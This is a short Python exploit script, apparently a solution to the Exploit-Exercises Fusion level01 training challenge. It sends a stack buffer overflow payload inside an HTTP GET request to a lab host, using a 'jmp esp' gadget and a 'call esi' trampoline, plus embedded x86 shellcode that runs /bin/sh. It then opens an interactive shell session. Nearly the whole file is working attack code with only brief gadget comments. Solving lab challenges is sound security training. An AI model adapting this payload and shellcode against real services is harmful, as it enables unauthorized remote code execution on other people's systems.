# exploit-ex fusion level01
from err0rless import connst, dump
from struct import pack

s, t = connst("192.168.95.152", 20001)

sc = ("\x6A\x0B\x58\x99\x52\x68\x2F\x2F\x73\x68"
      "\x68\x2F\x62\x69\x6E\x89\xE3\x31\xC9\xCD\x80")

# $ ./ROPgadget -file /opt/fusion/bin/level01 -g -asm "jmp *%esp"
# 0x08049f4f: "\xff\xe4 <==> jmp *%esp"
# 0x080483eb: ff d6        call   *%esi

def pMain():
    p  = "A" * 139
    p += pack("I", 0x08049f4f) # jmp esp
    p += "\x90\x90\xFF\xD6"    # jmp esi opcode

    s.send("GET " + p + " HTTP/1.1" + sc + "\n")

    t.interact()

if __name__ == "__main__":
    pMain()